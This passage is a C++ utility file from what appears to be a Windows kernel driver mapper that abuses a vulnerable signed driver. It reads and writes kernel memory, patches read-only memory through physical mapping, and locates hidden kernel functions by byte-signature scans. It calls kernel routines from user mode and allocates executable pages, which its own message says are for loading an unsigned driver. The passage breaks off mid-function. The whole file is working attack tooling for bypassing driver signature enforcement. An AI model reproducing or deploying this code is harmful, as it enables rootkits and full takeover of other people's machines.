#include "utils.h"
#pragma warning(disable : 4267)
#pragma warning(disable : 4244)
#pragma warning(disable : 4312)
#pragma warning(disable : 6386)
#define STATUS_UNSUCCESSFUL ((NTSTATUS)0xC0000001L)
#define STATUS_INFO_LENGTH_MISMATCH ((NTSTATUS)0xC0000004L)
#define STATUS_SUCCESS ((NTSTATUS)0x00000000L)


typedef NTSTATUS(*QuerySystemInformation)(IN SYSTEM_INFORMATION_CLASS SystemInformationClass,
    OUT PVOID SystemInformation,
    IN ULONG SystemInformationLength,
    OUT PULONG ReturnLength OPTIONAL);


PVOID general::ManipulateAddress(PVOID Address, ULONG64 Size, BOOL IsAdd) {
    if (IsAdd) {
        return (PVOID)((ULONG64)Address + Size);
    }
    return (PVOID)((ULONG64)Address - Size);
}


int general::CharpToWcharp(const char* ConvertString, WCHAR* ConvertedString) {
    int WideNameLen = MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, NULL, 0);
    MultiByteToWideChar(CP_UTF8, 0, ConvertString, -1, ConvertedString, WideNameLen);
    return WideNameLen;
}


int general::WcharpToCharp(char* ConvertedString, const WCHAR* ConvertString) {
    int MultiByteLen = WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, NULL, 0, NULL, NULL);
    WideCharToMultiByte(CP_UTF8, 0, ConvertString, -1, ConvertedString, MultiByteLen, NULL, NULL);
    return MultiByteLen;
}


std::wstring general::GetCurrentPathWide(std::wstring AddName) {
    WCHAR PathBuffer[MAX_PATH] = { 0 };
    GetModuleFileName(NULL, PathBuffer, MAX_PATH);
    std::wstring::size_type PathEndPos = std::wstring(PathBuffer).find_last_of(L"\\/");
    std::wstring CurrentPath = std::wstring(PathBuffer).substr(0, PathEndPos);
    if (AddName.c_str() != NULL) {
        return CurrentPath + AddName;
    }
    return CurrentPath;
}


void general::GetCurrentPathRegular(char Path[], std::wstring AddName) {
    std::wstring WideCurrentPath = GetCurrentPathWide(AddName);
    general::WcharpToCharp(Path, WideCurrentPath.c_str());
}


int general::CountOccurrences(const char* SearchStr, char SearchLetter) {
    DWORD Count = 0;
    for (int i = 0; i < strlen(SearchStr); i++) {
        if (SearchStr[i] == SearchLetter) {
            Count++;
        }
    }
    return Count;
}


void general::GetServiceName(char* Path, char* Buffer) {
    char TempBuffer[MAX_PATH] = { 0 };
    int bi = 0;
    int acbi = 0;
    int pi = (int)strlen(Path) - 1;

    for (; pi >= 0; pi--, bi++) {
        if (Path[pi] == '\\') {
            break;
        }
        TempBuffer[bi] = Path[pi];
    }
    TempBuffer[bi] = '\0';
    for (bi = (int)strlen(TempBuffer) - 1; bi >= 0; bi--, acbi++) {
        Buffer[acbi] = TempBuffer[bi];
    }
}


void general::ReplaceValues(const char* BaseString, REPLACEMENT RepArr[], char* Output, int Size) {
    int ii = 0;
    int repi = 0;
    int comi = 0;

    for (int i = 0; i <= strlen(BaseString); i++) {
        if (repi < Size && BaseString[i] == RepArr[repi].WhereTo) {
            memcpy((PVOID)((ULONG64)Output + comi), RepArr[repi].Replace, strlen(RepArr[repi].Replace));
            comi += strlen(RepArr[repi].Replace);

            RepArr[repi].RepCount -= 1;
            if (RepArr[repi].RepCount == 0) {
                repi++;
            }
        }
        else {
            Output[comi] = BaseString[i];
            comi++;
        }
    }
}


DWORD general::ExecuteSystem(const char* BaseCommand, REPLACEMENT RepArr[], int Size) {
    char Command[500] = { 0 };
    general::ReplaceValues(BaseCommand, RepArr, Command, Size);
    if (system(Command) == -1) {
        return GetLastError();
    }
    return 0;
}


void general::GetRandomName(char* NameBuf, DWORD RandSize, const char* Extension) {
    const char* Alp = "abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ0123456789,;[]{}-_=+)(&^%$#@!~`";
    std::random_device rd;
    std::mt19937 gen(rd());
    std::uniform_int_distribution<> distr(0, strlen(Alp) - 1);
    int i = 0;
    for (; i < (int)RandSize; i++) {
        NameBuf[i] = Alp[distr(gen)];
    }
    for (int exti = 0; exti <= strlen(Extension); exti++, i++) {
        NameBuf[i] = Extension[exti];
    }
}


int general::GetPidByName(const char* Name) {
    int ProcessId = 0;
    DWORD Procs[1024] = { 0 }, BytesReturned = 0, ProcessesNum = 0;
    char CurrentName[MAX_PATH] = { 0 };
    HANDLE CurrentProc = INVALID_HANDLE_VALUE;
    HMODULE CurrentProcMod = NULL;

    // Get the list of PIDs of all running processes -   
    if (!EnumProcesses(Procs, sizeof(Procs), &BytesReturned))
        return 0;
    ProcessesNum = BytesReturned / sizeof(DWORD);

    for (ULONG i = 0; i < ProcessesNum; i++) {
        if (Procs[i] != 0) {
            CurrentProc = OpenProcess(PROCESS_QUERY_INFORMATION | PROCESS_VM_READ, FALSE, Procs[i]);
            if (CurrentProc != NULL) {
                if (EnumProcessModules(CurrentProc, &CurrentProcMod, sizeof(CurrentProcMod), &BytesReturned)) {
                    GetModuleBaseNameA(CurrentProc, CurrentProcMod, CurrentName, sizeof(CurrentName) / sizeof(TCHAR));
                    if (lstrcmpiA(Name, CurrentName) == 0) {
                        ProcessId = Procs[i];
                        break;
                    }
                }
                CloseHandle(CurrentProc);
            }
        }
    }
    return ProcessId;
}


int general::CheckLetterInArr(char Chr, const char* Arr) {
    for (int i = 0; i < strlen(Arr); i++) {
        if (Arr[i] == Chr) {
            return i;
        }
    }
    return -1;
}


BOOL general::PerformCommand(const char* CommandArr[], const char* Replacements[], const char* Symbols, int CommandCount, int SymbolCount) {
    int ActualSize = 1;
    int CurrRepIndex = 0;
    int ActualCommandIndex = 0;
    int SystemReturn = -1;

    for (int ci = 0; ci < CommandCount; ci++) {
        ActualSize += strlen(CommandArr[ci]);
        for (int si = 0; si < SymbolCount; si++) {
            ActualSize -= CountOccurrences(CommandArr[ci], Symbols[si]);
            for (int r = 0; r < CountOccurrences(CommandArr[ci], Symbols[si]); r++) {
                ActualSize += strlen(Replacements[si]);
            }
        }
    }

    char* ActualCommand = (char*)malloc(ActualSize);
    if (ActualCommand == NULL) {
        return FALSE;
    }

    for (int ci = 0; ci < CommandCount; ci++) {
        for (int cii = 0; cii < strlen(CommandArr[ci]); cii++) {
            CurrRepIndex = CheckLetterInArr(CommandArr[ci][cii], Symbols);
            if (CurrRepIndex == -1) {
                ActualCommand[ActualCommandIndex] = CommandArr[ci][cii];
                ActualCommandIndex++;
            }
            else {
                for (int ri = 0; ri < strlen(Replacements[CurrRepIndex]); ri++) {
                    ActualCommand[ActualCommandIndex] = Replacements[CurrRepIndex][ri];
                    ActualCommandIndex++;
                }
            }
        }
    }
    ActualCommand[ActualCommandIndex] = '\0';
    SystemReturn = system(ActualCommand);
    if (SystemReturn == -1) {
        free(ActualCommand);
        return FALSE;
    }
    free(ActualCommand);
    return TRUE;
}


DWORD specific::MemoryToFile(LPCWSTR FileName, BYTE MemoryData[], SIZE_T MemorySize) {
    DWORD BytesWritten = 0;
    HANDLE VulnHandle = INVALID_HANDLE_VALUE;
    VulnHandle = CreateFileW(FileName, GENERIC_WRITE, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, CREATE_ALWAYS, FILE_ATTRIBUTE_NORMAL, NULL);
    if (VulnHandle == INVALID_HANDLE_VALUE) {
        return GetLastError();
    }
    if (!WriteFile(VulnHandle, MemoryData, MemorySize, &BytesWritten, NULL) || BytesWritten != MemorySize) {
        CloseHandle(VulnHandle);
        DeleteFile(FileName);
        return GetLastError();
    }
    CloseHandle(VulnHandle);
    return 0;
}


PVOID specific::FileToMemory(const char* FilePath, ULONG* PoolSize) {
    DWORD BytesRead = 0;
    PVOID PoolBuffer = NULL;
    HANDLE FileHandle = CreateFileA(FilePath, GENERIC_READ, FILE_SHARE_READ | FILE_SHARE_WRITE | FILE_SHARE_DELETE, NULL, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, NULL);
    if (FileHandle == INVALID_HANDLE_VALUE) {
        if (PoolSize != NULL) {
            *PoolSize = 0;
        }
        return NULL;
    }
    PoolBuffer = malloc(GetFileSize(FileHandle, NULL));
    if (PoolBuffer == NULL) {
        if (PoolSize != NULL) {
            *PoolSize = 0;
        }
        CloseHandle(FileHandle);
        return NULL;
    }
    if (!ReadFile(FileHandle, PoolBuffer, GetFileSize(FileHandle, NULL), &BytesRead, NULL) || BytesRead != GetFileSize(FileHandle, NULL)) {
        if (PoolSize != NULL) {
            *PoolSize = 0;
        }
        CloseHandle(FileHandle);
        free(PoolBuffer);
        return NULL;
    }
    *PoolSize = GetFileSize(FileHandle, NULL);
    CloseHandle(FileHandle);
    return PoolBuffer;
}


PVOID specific::GetKernelModuleAddress(const char* ModuleName) {
    PVOID ModulesInfo = NULL;
    PVOID ModuleBase = NULL;
    ULONG ModulesLength = 0;
    NTSTATUS Status = ERROR_SUCCESS;
    nt::PRTL_PROCESS_MODULES ActualModules = NULL;
    std::string CurrentName;
    HMODULE KernelLibrary = NULL;
    FARPROC ActualNtQueryDirectoryInformation = NULL;


    // Get a right-sized buffer for the modules info:
    KernelLibrary = GetModuleHandleA("ntdll.dll");
    if (KernelLibrary == NULL) {
        printf("[-] Cannot get handle to ntdll.dll to get kernel module address\n");
        return NULL;
    }
    ActualNtQueryDirectoryInformation = GetProcAddress(KernelLibrary, "NtQuerySystemInformation");
    if (ActualNtQueryDirectoryInformation == NULL) {
        printf("[-] Cannot get pointer to NtQuerySystemInformation to get kernel module address\n");
        return NULL;
    }
    QuerySystemInformation KernelQuerySystemInformation = (QuerySystemInformation)ActualNtQueryDirectoryInformation;
    Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
    while (Status == STATUS_INFO_LENGTH_MISMATCH) {
        if (ModulesInfo != NULL) {
            VirtualFree(ModulesInfo, 0, MEM_RELEASE);
        }
        ModulesInfo = VirtualAlloc(NULL, ModulesLength, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
        Status = KernelQuerySystemInformation((SYSTEM_INFORMATION_CLASS)nt::SystemModuleInformation, ModulesInfo, ModulesLength, &ModulesLength);
    }
    if (!NT_SUCCESS(Status) || ModulesInfo == NULL) {
        if (ModulesInfo != NULL) {
            VirtualFree(ModulesInfo, 0, MEM_RELEASE);
        }
        return NULL;
    }


    // Iterate through system modules (includes kernel somewhere):
    ActualModules = (nt::PRTL_PROCESS_MODULES)ModulesInfo;
    for (ULONG modulei = 0; modulei < ActualModules->NumberOfModules; ++modulei) {
        CurrentName = std::string(((char*)(ActualModules->Modules[modulei].FullPathName)) + ActualModules->Modules[modulei].OffsetToFileName);
        if (_stricmp(CurrentName.c_str(), ModuleName) == 0) {
            ModuleBase = ActualModules->Modules[modulei].ImageBase;
            VirtualFree(ModulesInfo, 0, MEM_RELEASE);
            return ModuleBase;
        }
    }
    VirtualFree(ModulesInfo, 0, MEM_RELEASE);
    return NULL;  // Did not find the system module
}


BOOL specific::CompareBetweenData(const BYTE DataToCheck[], const BYTE CheckAgainst[], const char* SearchMask) {
    for (; *SearchMask; ++SearchMask, ++DataToCheck, ++CheckAgainst) {
        if (*SearchMask == 'x' && *DataToCheck != *CheckAgainst)
            return FALSE;
    }
    return (*SearchMask) == 0;
}


PVOID specific::FindPattern(PVOID StartingAddress, ULONG SearchLength, BYTE CheckAgainst[], const char* SearchMask) {
    for (ULONG searchi = 0; searchi < SearchLength - strlen(SearchMask); searchi++) {
        if (specific::CompareBetweenData((BYTE*)((ULONG64)StartingAddress + searchi), CheckAgainst, SearchMask)) {
            return (PVOID)((ULONG64)StartingAddress + searchi);
        }
    }
    return NULL;
}


PVOID specific::FindSectionOfKernelModule(const char* SectionName, PVOID HeadersPointer, ULONG* SectionSize) {
    PIMAGE_NT_HEADERS ModuleHeaders = (PIMAGE_NT_HEADERS)((ULONG64)HeadersPointer + ((PIMAGE_DOS_HEADER)HeadersPointer)->e_lfanew);
    PIMAGE_SECTION_HEADER ModuleSections = IMAGE_FIRST_SECTION(ModuleHeaders);
    PIMAGE_SECTION_HEADER CurrentSection = NULL;
    for (ULONG sectioni = 0; sectioni < ModuleHeaders->FileHeader.NumberOfSections; ++sectioni) {
        CurrentSection = &ModuleSections[sectioni];
        if (memcmp(CurrentSection->Name, SectionName, strlen(SectionName)) == 0 &&
            strlen(SectionName) == strlen((char*)CurrentSection->Name)) {
            if (CurrentSection->VirtualAddress == 0) {
                return NULL;  // Offset from start of file, first 0x10000 are headers
            }
            if (SectionSize != NULL) {
                *SectionSize = CurrentSection->Misc.VirtualSize;
            }
            return (PVOID)((ULONG64)HeadersPointer + CurrentSection->VirtualAddress);
        }
    }
    return NULL;
}


PVOID specific::GetKernelModuleExport(HANDLE* DeviceHandle, PVOID ModuleBaseAddress, const char* ExportName) {
    IMAGE_DOS_HEADER KernelDosHeader = { 0 };
    IMAGE_NT_HEADERS64 KernelNtHeader = { 0 };
    PIMAGE_EXPORT_DIRECTORY KernelExportData = { 0 };
    PVOID KernelExportBaseAddress = NULL;
    DWORD KernelExportRVA = NULL;
    SIZE_T KernelExportSize = 0;
    SIZE_T BaseToDataOffset = 0;
    ULONG* ExportNameTable = NULL;
    USHORT* ExportOrdinalTable = NULL;
    ULONG* ExportFunctionTable = NULL;
    std::string CurrentFunctionName;
    USHORT CurrentFunctionOrdinalValue = 0;
    ULONG64 CurrentFunctionAddress = NULL;


    // Get DOS and NT headers of kernel, verify DOS and NT signature:
    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, ModuleBaseAddress, &KernelDosHeader, sizeof(KernelDosHeader)) || KernelDosHeader.e_magic != IMAGE_DOS_SIGNATURE) {
        return NULL;
    }
    if (!VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, general::ManipulateAddress(ModuleBaseAddress, KernelDosHeader.e_lfanew, TRUE), &KernelNtHeader, sizeof(KernelNtHeader)) || KernelNtHeader.Signature != IMAGE_NT_SIGNATURE) {
        return NULL;
    }


    // Get kernel export size and RVA from NT header:
    KernelExportRVA = KernelNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].VirtualAddress;
    KernelExportSize = KernelNtHeader.OptionalHeader.DataDirectory[IMAGE_DIRECTORY_ENTRY_EXPORT].Size;
    KernelExportBaseAddress = general::ManipulateAddress(ModuleBaseAddress, KernelExportRVA, TRUE);
    if (KernelExportRVA == NULL || KernelExportSize == 0) {
        return NULL;
    }


    // Get kernel export data:
    KernelExportData = (PIMAGE_EXPORT_DIRECTORY)VirtualAlloc(NULL, KernelExportSize, MEM_COMMIT | MEM_RESERVE, PAGE_READWRITE);
    if (KernelExportData == NULL || !VulnurableDriver::IoctlFunctions::MemoryRead(DeviceHandle, KernelExportBaseAddress, KernelExportData, KernelExportSize)) {
        VirtualFree(KernelExportData, 0, MEM_RELEASE);
        return NULL;
    }


    // Get the specific parts from the export data split up:
    BaseToDataOffset = (ULONG64)KernelExportData - (ULONG64)KernelExportRVA;
    ExportNameTable = (ULONG*)(KernelExportData->AddressOfNames + BaseToDataOffset);
    ExportOrdinalTable = (USHORT*)(KernelExportData->AddressOfNameOrdinals + BaseToDataOffset);
    ExportFunctionTable = (ULONG*)(KernelExportData->AddressOfFunctions + BaseToDataOffset);


    // Go over the exports and find the one that matches the RoutineName:
    for (ULONG exporti = 0; exporti < KernelExportData->NumberOfNames; ++exporti) {
        CurrentFunctionName = std::string((char*)(ExportNameTable[exporti] + BaseToDataOffset));
        if (_stricmp(CurrentFunctionName.c_str(), ExportName) == 0) {
            CurrentFunctionOrdinalValue = ExportOrdinalTable[exporti];
            if (ExportFunctionTable[CurrentFunctionOrdinalValue] <= 0x1000) {
                VirtualFree(KernelExportData, 0, MEM_RELEASE);
                return NULL;  // Invalid RVA of function in kernel
            }
            CurrentFunctionAddress = (ULONG64)ModuleBaseAddress + ExportFunctionTable[CurrentFunctionOrdinalValue];
            if ((ULONG64)ModuleBaseAddress + KernelExportRVA <= CurrentFunctionAddress && CurrentFunctionAddress <= (ULONG64)ModuleBaseAddress + KernelExportRVA + KernelExportSize) {
                VirtualFree(KernelExportData, 0, MEM_RELEASE);
                return NULL; // Function address is out of the exports section
            }

            VirtualFree(KernelExportData, 0, MEM_RELEASE);
            return (PVOID)CurrentFunctionAddress;
        }
    }

    VirtualFree(KernelExportData, 0, MEM_RELEASE);
    return NULL;
}


bool specific::ExReleaseResourceLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToRelease) {
    if (ResourceToRelease == NULL) {
        printf("[-] Releasing resource is a NULL pointer\n");
        return false;
    }
    PVOID KernelExReleaseResourceLite = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExReleaseResourceLite");
    if (KernelExReleaseResourceLite == NULL) {
        printf("[-] Cannot find export ExReleaseResourceLite\n");
        return false;
    }
    return CallKernelFunction(DeviceHandle, (PVOID)NULL, KernelExReleaseResourceLite, KernelBaseAddress, ResourceToRelease);
}


bool specific::ExAcquireResourceExclusiveLite(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID ResourceToAcquire, BOOLEAN ShouldWait) {
    BOOLEAN Output = FALSE;
    if (ResourceToAcquire == NULL) {
        return false;
    }
    PVOID KernelExAcquireResourceExclusiveLite = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExAcquireResourceExclusiveLite");
    if (KernelExAcquireResourceExclusiveLite == NULL) {
        return false;
    }
    return (CallKernelFunction(DeviceHandle, &Output, KernelExAcquireResourceExclusiveLite, KernelBaseAddress, ResourceToAcquire, ShouldWait) && Output);
}


PVOID specific::RtlLookupElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer) {
    PVOID FunctionOutput = NULL;
    PVOID KernelRtlLookupElementGenericTableAvl = NULL;
    if (LookupTable == NULL || EntryBuffer == NULL) {
        return NULL;
    }
    KernelRtlLookupElementGenericTableAvl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlLookupElementGenericTableAvl");
    if (KernelRtlLookupElementGenericTableAvl == NULL) {
        printf("[-] Failed to get the address of RtlLookupElementGenericTableAvl\n");
        return NULL;
    }
    if (!CallKernelFunction(DeviceHandle, &FunctionOutput, KernelRtlLookupElementGenericTableAvl, KernelBaseAddress, LookupTable, EntryBuffer)) {
        return NULL;
    }
    return FunctionOutput;
}


BOOLEAN specific::RtlDeleteElementGenericTableAvl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::PRTL_AVL_TABLE LookupTable, PVOID EntryBuffer) {
    bool FunctionOutput = false;
    PVOID KernelRtlDeleteElementGenericTableAvl = NULL;
    if (LookupTable == NULL || EntryBuffer == NULL) {
        return false;
    }
    KernelRtlDeleteElementGenericTableAvl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "RtlDeleteElementGenericTableAvl");
    if (KernelRtlDeleteElementGenericTableAvl == NULL) {
        printf("[-] Failed to get the address of RtlDeleteElementGenericTableAvl\n");
        return false;
    }
    return (CallKernelFunction(DeviceHandle, &FunctionOutput, KernelRtlDeleteElementGenericTableAvl, KernelBaseAddress, LookupTable, EntryBuffer) && FunctionOutput);
}


BOOL specific::HandleExFreePool(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID PoolAddress) {
    if (PoolAddress == NULL) {
        return FALSE;
    }
    PVOID ActualExFreePool = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExFreePool");
    if (ActualExFreePool == NULL) {
        return FALSE;
    }
    return CallKernelFunction(DeviceHandle, (PVOID*)NULL, ActualExFreePool, KernelBaseAddress, PoolAddress);
}


NTSTATUS specific::HandleNtQuerySystemInformation(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SYSTEM_INFORMATION_CLASS SystemInformationClass,
    PVOID SystemInformation, ULONG SystemInformationLength, PULONG ReturnLength) {
    NTSTATUS ReturnStatus = STATUS_UNSUCCESSFUL;
    PVOID ActualNtQuerySystemInformation = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "NtQuerySystemInformation");
    if (ActualNtQuerySystemInformation == NULL) {
        return STATUS_UNSUCCESSFUL;
    }
    if (!CallKernelFunction(DeviceHandle, &ReturnStatus, ActualNtQuerySystemInformation, KernelBaseAddress,
        SystemInformationClass, SystemInformation, SystemInformationLength, ReturnLength)) {
        return STATUS_UNSUCCESSFUL;
    }
    return ReturnStatus; 
}


BOOL specific::WriteToReadOnlyMemory(HANDLE* DeviceHandle, PVOID DestinationAddress, PVOID SourceAddress, SIZE_T WriteSize) {
    PVOID PhysicalDestination = NULL;
    PVOID MappedDestination = NULL;
    BOOL Result = FALSE;
    if (DeviceHandle == NULL || DestinationAddress == NULL || SourceAddress == NULL || WriteSize == 0) {
        return FALSE;
    }
    if (!VulnurableDriver::IoctlFunctions::VirtualToPhysical(DeviceHandle, DestinationAddress, &PhysicalDestination) ||
        PhysicalDestination == NULL) {
        return FALSE;
    }
    MappedDestination = VulnurableDriver::IoctlFunctions::MapIoSpace(DeviceHandle, PhysicalDestination, (ULONG)WriteSize);
    if (MappedDestination == NULL) {
        return FALSE;
    }
    Result = VulnurableDriver::IoctlFunctions::MemoryWrite(DeviceHandle, MappedDestination, SourceAddress, (ULONG64)WriteSize);
    VulnurableDriver::IoctlFunctions::UnmapIoSpace(DeviceHandle, MappedDestination, (ULONG)WriteSize);
    return Result;
}


PVOID allocations::MmAllocateIndependentPagesEx(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize){
    PVOID AllocatedPages = NULL;
    BYTE NeededAllocateIndependent[] = "\xE8\x00\x00\x00\x00\x48\x8B\xF0\x48\x85\xC0\x0F\x84\x00\x00\x00\x00\x44\x8B\xC5\x33\xD2\x48\x8B\xC8\xE8\x00\x00\x00\x00\x48\x8D\x46\x3F\x48\x83\xE0\xC0";
    const char* AllocateIndependentMask = "x????xxxxxxxx????xxxxxxxxx????xxxxxxxx";
    PVOID KernelMmAllocateIndependentPagesEx = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGELK", KernelBaseAddress, NeededAllocateIndependent, AllocateIndependentMask);
    if (KernelMmAllocateIndependentPagesEx == NULL) {
        return NULL;
    }
    KernelMmAllocateIndependentPagesEx = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, KernelMmAllocateIndependentPagesEx, 1, 5);
    if (KernelMmAllocateIndependentPagesEx == NULL) {
        return NULL;
    }

    if (!CallKernelFunction(DeviceHandle, &AllocatedPages, KernelBaseAddress, KernelMmAllocateIndependentPagesEx, AllocationSize, -1, 0, 0)) {
        return NULL;
    }
    return AllocatedPages;
}


BOOL allocations::MmFreeIndependentPages(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID AllocationAddress, SIZE_T AllocationSize){
    PVOID DummyReturn = NULL;
    BYTE NeededFreeIndependent[] = "\xBA\x00\x60\x00\x00\x48\x8B\xCB\xE8\x00\x00\x00\x00\x48\x8D\x8B\x00\xF0\xFF\xFF";
    const char* FreeIndependentMask = "xxxxxxxxx????xxxxxxx";
    PVOID KernelMmFreeIndependentPages = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, NeededFreeIndependent, FreeIndependentMask);
    if (KernelMmFreeIndependentPages == NULL) {
        return FALSE;
    }
    KernelMmFreeIndependentPages = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, KernelMmFreeIndependentPages, 1, 5);
    if (KernelMmFreeIndependentPages == NULL) {
        return FALSE;
    }
    return CallKernelFunction(DeviceHandle, &DummyReturn, KernelBaseAddress, KernelMmFreeIndependentPages, AllocationAddress, AllocationSize);
}


BOOL allocations::MmSetPageProtection(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID AllocationAddress, SIZE_T AllocationSize, ULONG NewProtection){
    BOOLEAN SetProtectionResult = FALSE;
    BYTE NeededSetPageProtection[] = "\x41\xB8\x00\x00\x00\x00\x48\x00\x00\x00\x8B\x00\xE8\x00\x00\x00\x00\x84\xC0\x74\x09\x48\x81\xEB\x00\x00\x00\x00\xEB";
    const char* SetPageProtectionMask = "xx????x???x?x????xxxxxxx????x";
    PVOID KernelMmSetPageProtection = VulnurableDriver::HelperFunctions::FindPatternInSectionOfKernelModule(DeviceHandle, "PAGE", KernelBaseAddress, NeededSetPageProtection, SetPageProtectionMask);
    if (KernelMmSetPageProtection == NULL) {
        return FALSE;
    }
    KernelMmSetPageProtection = general::ManipulateAddress(KernelMmSetPageProtection, 12, TRUE);
    KernelMmSetPageProtection = VulnurableDriver::HelperFunctions::RelativeAddressToActual(DeviceHandle, KernelMmSetPageProtection, 1, 5);
    if (KernelMmSetPageProtection == NULL) {
        return FALSE;
    }
    return (CallKernelFunction(DeviceHandle, &SetProtectionResult, KernelBaseAddress, KernelMmSetPageProtection, AllocationAddress, AllocationSize, NewProtection) && SetProtectionResult);
}


PVOID allocations::MmAllocatePagesForMdl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, LARGE_INTEGER LowAddress, LARGE_INTEGER HighAddress, LARGE_INTEGER SkipBytes, SIZE_T TotalBytes){
    PVOID PageAllocationBase = NULL;
    PVOID KernelMmAllocatePagesForMdl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "MmAllocatePagesForMdl");
    if (KernelMmAllocatePagesForMdl == NULL) {
        return NULL;
    }
    if (!CallKernelFunction(DeviceHandle, &PageAllocationBase, KernelBaseAddress, KernelMmAllocatePagesForMdl, LowAddress, HighAddress, SkipBytes, TotalBytes)) {
        return NULL;
    }
    return PageAllocationBase;
}


PVOID allocations::MmMapLockedPagesSpecifyCache(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PMDL DesciptorModule, nt::KPROCESSOR_MODE AccessMode, nt::MEMORY_CACHING_TYPE CacheType, PVOID RequestedAddress, ULONG BugCheckOnFailure, ULONG Priority){
    PVOID MappingAddress = NULL;
    PVOID KernelMmMapLockedPagesSpecifyCache = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "MmMapLockedPagesSpecifyCache");
    if (KernelMmMapLockedPagesSpecifyCache == NULL) {
        return NULL;
    }
    if (!CallKernelFunction(DeviceHandle, &MappingAddress, KernelBaseAddress, KernelMmMapLockedPagesSpecifyCache, DesciptorModule, AccessMode, CacheType, RequestedAddress, BugCheckOnFailure, Priority)) {
        return NULL;
    }
    return MappingAddress;
}


BOOL allocations::MmProtectMdlSystemAddress(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID MemoryDescriptorList, ULONG NewProtect){
    NTSTATUS ReturnedStatus = STATUS_UNSUCCESSFUL;
    PVOID KernelMmProtectMdlSystemAddress = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "MmProtectMdlSystemAddress");
    if (KernelMmProtectMdlSystemAddress == NULL) {
        return NULL;
    }
    if (!CallKernelFunction(DeviceHandle, &ReturnedStatus, KernelBaseAddress, KernelMmProtectMdlSystemAddress, MemoryDescriptorList, NewProtect)) {
        return NULL;
    }
    return NT_SUCCESS(ReturnedStatus);
}


BOOL allocations::MmUnmapLockedPages(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID BaseAddress, PMDL DesciptorModule){
    PVOID KernelMmUnmapLockedPages = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "MmUnmapLockedPages");
    if (KernelMmUnmapLockedPages == NULL) {
        return FALSE;
    }
    return CallKernelFunction(DeviceHandle, (PVOID*)NULL, KernelBaseAddress, KernelMmUnmapLockedPages, BaseAddress, DesciptorModule);
}


BOOL allocations::MmFreePagesFromMdl(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID MemoryDescriptorList){
    PVOID KernelMmFreePagesFromMdl = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "MmFreePagesFromMdl");
    if (KernelMmFreePagesFromMdl == NULL) {
        return FALSE;
    }
    return CallKernelFunction(DeviceHandle, (PVOID*)NULL, KernelBaseAddress, KernelMmFreePagesFromMdl, MemoryDescriptorList);
}


PVOID allocations::ExAllocatePoolWithTag(HANDLE* DeviceHandle, PVOID KernelBaseAddress, nt::POOL_TYPE PoolType, ULONG64 AllocationSize) {
    PVOID AllocatedPool = NULL;
    PVOID KernelExAllocatePoolWithTag = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExAllocatePoolWithTag");
    if (KernelExAllocatePoolWithTag == NULL) {
        return NULL;
    }
    if (!CallKernelFunction(DeviceHandle, &AllocatedPool, KernelBaseAddress, KernelExAllocatePoolWithTag, PoolType, AllocationSize)) {
        return NULL;
    }
    return AllocatedPool;
}


BOOL allocations::ExFreePool(HANDLE* DeviceHandle, PVOID KernelBaseAddress, PVOID KernelPoolAddress) {
    PVOID KernelExFreePool = specific::GetKernelModuleExport(DeviceHandle, KernelBaseAddress, "ExFreePool");
    if (KernelExFreePool == NULL) {
        return FALSE;
    }
    return CallKernelFunction(DeviceHandle, (PVOID*)NULL, KernelBaseAddress, KernelExFreePool, KernelPoolAddress);
}


PVOID allocations::AllocateIndependentPagesWrapper(HANDLE* DeviceHandle, PVOID KernelBaseAddress, SIZE_T AllocationSize) {
    PVOID AllocationBase = allocations::MmAllocateIndependentPagesEx(DeviceHandle, KernelBaseAddress, AllocationSize);
    if (AllocationBase == NULL){
        printf("[-] Failed to allocate independent pages for unsigned driver / other purposes\n");
        return NULL;
    }
    if (!allocations::MmSetPageProtection(DeviceHandle, KernelBaseAddress, AllocationBase, AllocationSize, PAGE_EXECUTE_READWRITE)) {
        printf("[-] Failed to set protection for independent pages to PAGE_EXECUTE_READWRITE (rxw) for unsigned driver / other purposes\n");
